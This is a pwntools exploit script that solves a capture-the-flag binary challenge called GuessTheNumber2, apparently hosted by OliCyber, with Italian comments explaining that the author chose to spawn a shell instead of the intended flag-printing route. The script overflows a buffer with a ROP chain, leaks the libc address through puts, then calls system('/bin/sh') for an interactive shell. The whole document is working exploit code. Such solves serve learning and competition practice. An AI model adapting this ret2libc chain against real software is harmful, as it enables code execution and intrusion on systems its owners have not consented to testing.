# SOLVE COMPLETAMENTE UNINTENDED, IN TEORIA AVREI DOVUTO CHIAMARE printScores USANDO
# COME PARAMETRO unused_var IN CUI METTEVO "flag.txt", MA IO *ADORO* SPAWNARE SHELL.
# SONO SICURO QUELLA FOSSE LA SOLVE INTENDED PERCHÈ IL FILE CON LA FLAG CONTIENE LA
# VIRGOLA ALLA FINE, PROPRIO PER VENIR PRINTATA DA printScores.

from pwn import *

exe = ELF("./GuessTheNumber2_patched")
libc = ELF("./libc.so.6")

context.binary = exe

HOST = "gtn2.challs.olicyber.it"
PORT = 10023

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r
    
def leak_libc(r):
    rop = ROP(exe)
    rop.call("puts", [exe.got.puts])
    rop.call("main", [])

    r.sendlineafter(b"scores:", b"\x00" * 36 + rop.chain())
    r.sendlineafter(b"use:", b"0")

    r.recvuntil(b":(\n")
    r.recvuntil(b":(\n")

    libc.address = int.from_bytes(r.recvline()[::-1][1:]) - libc.symbols.puts
    log.success(f"LEAKED LIBC: {hex(libc.address)}")

def call_system(r):
    rop = ROP(libc)
    rop.raw(rop.ret.address)
    rop.call("system", [next(libc.search(b"/bin/sh\x00"))])

    r.sendlineafter(b"scores:", b"\x00" * 36 + rop.chain())
    r.sendlineafter(b"use:", b"0")
    
def main():    
    r = conn()

    leak_libc(r)
    call_system(r)
    
    r.interactive()

if __name__ == "__main__":
    main()
